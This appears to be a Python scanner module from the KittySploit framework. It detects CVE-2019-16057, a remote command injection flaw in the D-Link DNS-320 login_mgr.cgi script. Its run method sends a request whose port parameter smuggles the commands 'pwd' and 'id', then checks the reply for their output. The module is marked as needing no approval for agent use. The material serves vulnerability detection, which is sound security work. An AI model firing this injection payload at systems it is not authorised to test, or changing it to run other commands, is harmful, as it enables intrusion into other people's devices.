#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The login_mgr."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DNS-320 - Remote Code Execution Detection',
        'description': 'The login_mgr.cgi script in D-Link DNS-320 through 2.05.B10 is vulnerable to remote command injection.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'lfi', 'rce', 'kev', 'sharecenter', 'dlink', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2019-16057',
            'https://web.archive.org/web/20201222035258im_/https://blog.cystack.net/content/images/2019/09/poc.png',
            'https://www.ftc.gov/system/files/documents/cases/dlink_proposed_order_and_judgment_7-2-19.pdf',
            'https://github.com/Ostorlab/known_exploited_vulnerbilities_detectors',
            'https://github.com/Z0fhack/Goby_POC',
        ],
        'cve': 'CVE-2019-16057',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cgi-bin/login_mgr.cgi?C1=ON&cmd=login&f_type=1&f_username=admin&port=80%7Cpwd%26id&pre_pwd=1&pwd=%20&ssl=1&ssl_port=1&username=', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('uid=', 'gid=', 'pwd&id',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="D-Link DNS-320 - Remote Code Execution detected",
                path='/cgi-bin/login_mgr.cgi?C1=ON&cmd=login&f_type=1&f_username=admin&port=80%7Cpwd%26id&pre_pwd=1&pwd=%20&ssl=1&ssl_port=1&username=',
            )
            return True
        return False

